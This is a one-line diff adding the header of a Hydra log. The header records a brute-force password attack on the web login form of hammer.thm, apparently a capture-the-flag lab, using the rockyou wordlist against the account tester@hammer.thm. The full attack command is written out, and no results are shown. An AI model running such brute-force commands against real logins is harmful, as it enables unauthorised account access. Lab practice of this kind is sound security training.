@@ -1,0 +1,1 @@
+# Hydra v9.4 run at 2025-08-22 13:49:35 on hammer.thm http-post-form (hydra -l tester@hammer.thm -P /usr/share/wordlists/rockyou.txt -t 32 -W 2 -I -o enumeration/hydra-login.txt hammer.thm http-post-form /:email=^USER^&password=^PASS^:F=1420)
